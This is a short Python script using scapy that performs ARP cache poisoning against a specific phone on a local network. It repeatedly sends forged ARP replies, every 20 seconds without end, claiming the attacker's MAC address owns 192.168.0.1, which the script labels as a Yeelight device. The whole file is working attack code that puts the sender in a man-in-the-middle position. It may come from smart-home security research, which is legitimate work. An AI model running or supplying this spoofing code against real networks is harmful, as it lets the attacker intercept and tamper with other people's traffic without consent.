from scapy.all import *

macAttacker = get_if_hwaddr("wlp3s0") #"10:4a:7d:53:88:bb"
ipAttacker = get_if_addr("wlp3s0")

macPhone = "c0:ee:fb:df:58:08"
ipPhone = "192.168.0.212"

ipYeelight = "192.168.0.1"


arp = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = ipYeelight
arp[ARP].hwdst = macPhone
arp[ARP].pdst = ipPhone

sendp(arp, inter = 20, count=-1, iface=conf.iface)